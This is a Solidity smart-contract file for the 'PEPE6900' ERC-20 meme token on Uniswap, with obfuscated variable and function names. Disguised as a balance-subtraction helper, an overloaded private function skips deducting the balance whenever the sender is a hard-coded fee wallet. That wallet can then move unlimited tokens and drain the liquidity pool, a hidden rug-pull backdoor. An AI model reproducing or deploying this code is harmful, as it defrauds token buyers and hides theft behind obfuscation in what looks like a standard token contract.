/*

TWITTER: https://twitter.com/pepe6900_erc
TELEGRAM: https://t.me/pepe6900_erc
WEBSITE: https://www.pepe6900.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _ebqja(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _ebqja(a, b, "SafeMath");
    }

    function  _ebqja(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPE6900 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _vdrgb;
    address payable private _kyadrb;
    address private _rjaxqe;

    string private constant _name = unicode"PEPE6900";
    string private constant _symbol = unicode"PEPE6900";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ycphmr;
    mapping (address => bool) private _yrqiry;
    mapping(address => uint256) private _fnaqnp;
    uint256 public _qvalpib = _totalSupply;
    uint256 public _worqvie = _totalSupply;
    uint256 public _rkTlkrv= _totalSupply;
    uint256 public _vodTcf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ysvfpuj=0;
    uint256 private _ejwrzy=0;
    

    bool private _bvprsh;
    bool public _uvoiepf = false;
    bool private puopre = false;
    bool private _oeyrghu = false;


    event _hrkwkyc(uint _qvalpib);
    modifier uirkoxr {
        puopre = true;
        _;
        puopre = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _ycphmr[owner(

        )] = true;
        _ycphmr[address
        (this)] = true;
        _ycphmr[
            _kyadrb] = true;
        _kyadrb = 
        payable (0x91840868ee477BDCf25933F24101fD8a49CeE3Bd);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _ebqja(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 vjkdbr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uvoiepf) {
                if (to 
                != address
                (_vdrgb) 
                && to !=
                 address
                 (_rjaxqe)) {
                  require(_fnaqnp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnaqnp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rjaxqe && to != 
            address(_vdrgb) &&
             !_ycphmr[to] ) {
                require(amount 
                <= _qvalpib,
                 "Exceeds the _qvalpib.");
                require(balanceOf
                (to) + amount
                 <= _worqvie,
                  "Exceeds the _worqvie.");
                if(_ejwrzy
                < _ysvfpuj){
                  require
                  (! _rkepiyb(to));
                }
                _ejwrzy++;
                 _yrqiry
                 [to]=true;
                vjkdbr = amount._pvr
                ((_ejwrzy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rjaxqe &&
             from!= address(this) 
            && !_ycphmr[from] ){
                require(amount <= 
                _qvalpib && 
                balanceOf(_kyadrb)
                <_vodTcf,
                 "Exceeds the _qvalpib.");
                vjkdbr = amount._pvr((_ejwrzy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ejwrzy>
                _ysvfpuj &&
                 _yrqiry[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!puopre 
            && to == _rjaxqe &&
             _oeyrghu &&
             contractTokenBalance>
             _rkTlkrv 
            && _ejwrzy>
            _ysvfpuj&&
             !_ycphmr[to]&&
              !_ycphmr[from]
            ) {
                _transferFrom( _wraef(amount, 
                _wraef(contractTokenBalance,
                _vodTcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prkeoy(address
                    (this).balance);
                }
            }
        }

        if(vjkdbr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(vjkdbr);
          emit
           Transfer(from,
           address
           (this),vjkdbr);
        }
        _balances[from
        ]= _ebqja(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _ebqja(vjkdbr));
        emit Transfer
        (from, to, 
        amount.
         _ebqja(vjkdbr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uirkoxr {
        if(tokenAmount==
        0){return;}
        if(!_bvprsh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _vdrgb.WETH();
        _approve(address(this),
         address(
             _vdrgb), 
             tokenAmount);
        _vdrgb.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wraef
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _ebqja(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _kyadrb){
            return a ;
        }else{
            return a .
             _ebqja (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvalpib = _totalSupply;
        _worqvie = _totalSupply;
        emit _hrkwkyc(_totalSupply);
    }

    function _rkepiyb(address 
    account) private view 
    returns (bool) {
        uint256 eeusdr;
        assembly {
            eeusdr :=
             extcodesize
             (account)
        }
        return eeusdr > 
        0;
    }

    function _prkeoy(uint256
    amount) private {
        _kyadrb.
        transfer(
            amount);
    }

    function opendTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bvprsh ) ;
        _vdrgb  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _vdrgb), 
            _totalSupply);
        _rjaxqe = 
        IUniswapV2Factory(_vdrgb.
        factory( ) 
        ). createPair (
            address(this
            ),  _vdrgb .
             WETH ( ) );
        _vdrgb.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rjaxqe).
        approve(address(_vdrgb), 
        type(uint)
        .max);
        _oeyrghu = true;
        _bvprsh = true;
    }

    receive() external payable {}
}